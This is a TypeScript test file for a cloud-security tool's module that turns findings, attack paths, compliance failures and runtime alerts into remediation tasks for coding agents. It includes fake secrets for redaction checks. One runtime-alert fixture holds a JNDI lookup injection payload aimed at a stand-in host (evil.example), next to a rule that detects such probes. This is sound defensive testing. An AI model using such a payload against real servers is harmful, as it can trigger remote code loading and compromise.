import {
  buildCliCommandsForTask,
  buildHandoffTaskDrafts,
  buildTasksMarkdownPack,
  computeTaskFingerprint,
  handoffIssueFromAttackPath,
  handoffIssueFromComplianceControl,
  handoffIssueFromContainerCve,
  handoffIssueFromFinding,
  handoffIssueFromRuntimeAlert,
  redactHandoffText,
} from "@/lib/handoff/tasks";
import type { ControlResult } from "@/lib/compliance/types";
import type { SecurityFinding } from "@/lib/gcp/types";
import type { AttackPath } from "@/lib/gcp/attack-paths";
import type { RuntimeRequestEvent, RuntimeSecurityRule } from "@/lib/runtime-security";

describe("lib/handoff/tasks", () => {
  it("redacts connection string passwords, keys, and tokens from exported text", () => {
    const raw = [
      "DATABASE_URL=postgresql://admin:SuperSecretPass123!@10.0.0.5:5432/prod",
      "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.abc.def",
      "GOOGLE_KEY=AIzaSyDummyKeyValue1234567890",
      "OPENAI=sk-proj-1234567890abcdef123456",
      "AWS=AKIAIOSFODNN7EXAMPLE",
      "WATCHMEN=wm_0123456789abcdef0123456789abcdef",
    ].join("\n");

    const redacted = redactHandoffText(raw);
    expect(redacted).not.toContain("SuperSecretPass123!");
    expect(redacted).not.toContain("eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9");
    expect(redacted).not.toContain("AIzaSyDummyKeyValue1234567890");
    expect(redacted).not.toContain("sk-proj-1234567890abcdef123456");
    expect(redacted).not.toContain("AKIAIOSFODNN7EXAMPLE");
    expect(redacted).not.toContain("wm_0123456789abcdef0123456789abcdef");
    expect(redacted).toContain("[REDACTED]");
  });

  it("groups findings by category, combines, or splits individually", () => {
    const fwFinding: SecurityFinding = {
      id: "public_firewall:proj-1:allow-ssh",
      severity: "critical",
      title: "Firewall Rule Open to the Internet",
      description: "Allows 0.0.0.0/0 on port 22",
      resourceName: "allow-ssh",
      projectId: "proj-1",
      resourceType: "firewall_rule",
      remediationHint: "Restrict sourceRanges",
    };

    const bucketFinding: SecurityFinding = {
      id: "public_bucket:proj-1:logs-bucket",
      severity: "high",
      title: "Publicly Accessible Storage Bucket",
      description: "Grants allUsers access",
      resourceName: "logs-bucket",
      projectId: "proj-1",
      resourceType: "storage_bucket",
      remediationHint: "Remove allUsers binding",
    };

    const issues = [
      handoffIssueFromFinding({ ...fwFinding, cloud: "gcp" }, { investigationReport: "Confirmed open to internet." }),
      handoffIssueFromFinding({ ...bucketFinding, cloud: "gcp" }),
    ];

    const grouped = buildHandoffTaskDrafts({ issues, batchMode: "grouped", targetTool: "opencode" });
    expect(grouped).toHaveLength(2);
    expect(grouped[0].promptMarkdown).toContain("Confirmed open to internet.");

    const combined = buildHandoffTaskDrafts({ issues, batchMode: "combined", targetTool: "claude" });
    expect(combined).toHaveLength(1);
    expect(combined[0].severity).toBe("critical");
    expect(combined[0].issueCount).toBe(2);

    const individual = buildHandoffTaskDrafts({ issues, batchMode: "individual", targetTool: "codex" });
    expect(individual).toHaveLength(2);
    expect(individual[0].issueCount).toBe(1);
  });

  it("converts attack paths into handoff issues and computes deterministic fingerprints", () => {
    const attackPath: AttackPath = {
      id: "ap:proj-1:fw-to-sa",
      severity: "critical",
      title: "Internet -> VM -> Admin SA",
      description: "Exposed SSH leads to privileged service account.",
      nodes: [
        {
          id: "n1",
          kind: "entry",
          resourceType: "firewall_rule",
          label: "fw-ssh",
          detail: "0.0.0.0/0:22",
          projectId: "proj-1",
          risk: "Open SSH",
        },
      ],
      mitigations: ["Restrict SSH to IAP"],
    };

    const issue = handoffIssueFromAttackPath({ ...attackPath, cloud: "gcp" });
    expect(issue.kind).toBe("attack_path");
    expect(issue.projectId).toBe("proj-1");

    const fp1 = computeTaskFingerprint("grouped", ["b", "a"]);
    const fp2 = computeTaskFingerprint("grouped", ["a", "b"]);
    expect(fp1).toBe(fp2);
  });

  it("generates CLI commands for opencode, claude, codex, and markdown packs", () => {
    const cmdsApi = buildCliCommandsForTask({
      taskId: "wm_tsk_abc123",
      title: "Firewall issues",
      promptMarkdown: "# Prompt body",
      origin: "https://watchmen.example.com/",
      preferApiFetch: true,
    });

    expect(cmdsApi.opencode).toContain("opencode run ");
    expect(cmdsApi.opencode).toContain("https://watchmen.example.com/api/handoff/tasks/wm_tsk_abc123");
    expect(cmdsApi.claude).toContain("claude ");
    expect(cmdsApi.claudeHeadless).toContain("claude -p ");
    expect(cmdsApi.codex).toContain("codex ");
    expect(cmdsApi.codexHeadless).toContain("codex exec ");
    expect(cmdsApi.curl).toContain("Authorization: Bearer $WATCHMEN_API_TOKEN");

    const pack = buildTasksMarkdownPack([
      { id: "wm_tsk_abc123", title: "Firewall issues", severity: "critical", promptMarkdown: "# Task 1" },
    ]);
    expect(pack).toContain("Watchmen Security Task Pack (v0.9)");
    expect(pack).toContain("wm_tsk_abc123");
  });

  it("converts compliance controls with evidence and AI recommendations into handoff issues", () => {
    const control: ControlResult = {
      id: "gcp:CC6.7.a",
      title: "Restrict public firewall ingress",
      description: "Firewall rules should not expose sensitive ports to 0.0.0.0/0.",
      status: "fail",
      impact: "critical",
      evidence: [{ name: "allow-ssh", projectId: "proj-1" }],
      remediationHint: "Restrict sourceRanges on allow-ssh",
    };

    const issue = handoffIssueFromComplianceControl(control, {
      standard: "SOC 2 Type II",
      categoryName: "CC6.7 Network Security",
      aiRecommendation: "Use IAP TCP forwarding instead of 0.0.0.0/0",
    });

    expect(issue.kind).toBe("compliance_control");
    expect(issue.cloud).toBe("gcp");
    expect(issue.projectId).toBe("proj-1");
    expect(issue.resourceName).toBe("allow-ssh");
    expect(issue.description).toContain("SOC 2 Type II");
    expect(issue.proposedPlan).toContain("IAP TCP forwarding");

    const drafts = buildHandoffTaskDrafts({ issues: [issue], batchMode: "grouped", targetTool: "opencode" });
    expect(drafts).toHaveLength(1);
    expect(drafts[0].promptMarkdown).toContain("allow-ssh");
  });

  it("generates Shirudo live-shield tasks with distinct fingerprints, Beefile scaffolds, and secret redaction", () => {
    const javaCveIssue = handoffIssueFromContainerCve({
      imageRef: "us-docker.pkg.dev/proj-1/app/elasticsearch:9.5.5",
      imageName: "elasticsearch",
      cloud: "gcp",
      accountId: "proj-1",
      cve: {
        cveId: "CVE-2026-4444",
        packageName: "openjdk-21",
        installedVersion: "21.0.2",
        fixedVersion: "21.0.3",
        severity: "critical",
        description: "Java4Shell Base64 decoder memory overwrite",
      },
    });

    const iacDrafts = buildHandoffTaskDrafts({
      issues: [javaCveIssue],
      batchMode: "individual",
      targetTool: "codex",
      remediationMode: "iac",
    });
    const shieldDrafts = buildHandoffTaskDrafts({
      issues: [javaCveIssue],
      batchMode: "individual",
      targetTool: "codex",
      remediationMode: "shirudo_shield",
    });

    expect(iacDrafts[0].fingerprint).not.toBe(shieldDrafts[0].fingerprint);
    expect(shieldDrafts[0].title).toMatch(/^\[Shirudo Shield\]/);
    expect(shieldDrafts[0].payload.remediationMode).toBe("shirudo_shield");
    expect(shieldDrafts[0].promptMarkdown).toContain("Shirudo Live Shield (upatch)");
    expect(shieldDrafts[0].promptMarkdown).toContain("Java agent upatch");
    expect(shieldDrafts[0].promptMarkdown).toContain('fixes = ["CVE-2026-4444"]');
    expect(shieldDrafts[0].promptMarkdown).toContain("ML-DSA-87");

    const runtimeEvent: RuntimeRequestEvent = {
      id: "evt-rce-1",
      ts: "2026-11-24T08:00:00Z",
      sourceIp: "203.0.113.5",
      sourceIpClass: "public",
      method: "POST",
      path: "/api/import",
      destinationWorkload: "checkout-api",
      destinationNamespace: "prod",
      decision: "would_block",
      matchedRuleIds: ["rule-rce"],
      reasons: ["RCE probe detected"],
      highestSeverity: "critical",
      bodySample: "Authorization: Bearer super_secret_token_123456; ${jndi:ldap://evil.example/a}",
    };
    const rule: RuntimeSecurityRule = {
      id: "rule-rce",
      name: "Block RCE Probe",
      enabled: true,
      action: "block",
      mode: "detect",
      condition: { kind: "known_attack_vector", value: "rce_probe" },
      severity: "critical",
      description: "Detects JNDI and shell command probes",
    };

    const alertIssue = handoffIssueFromRuntimeAlert({
      event: runtimeEvent,
      matchedRules: [rule],
    });
    expect(alertIssue.kind).toBe("runtime_alert");
    expect(alertIssue.resourceName).toBe("checkout-api");
    expect(alertIssue.description).not.toContain("super_secret_token_123456");
    expect(alertIssue.description).toContain("[REDACTED]");

    const bpfDrafts = buildHandoffTaskDrafts({
      issues: [alertIssue],
      batchMode: "grouped",
      targetTool: "opencode",
      remediationMode: "shirudo_shield",
    });
    expect(bpfDrafts).toHaveLength(1);
    expect(bpfDrafts[0].promptMarkdown).toContain("BPF C upatch");
    expect(bpfDrafts[0].promptMarkdown).toContain("checkout-api");
  });
});
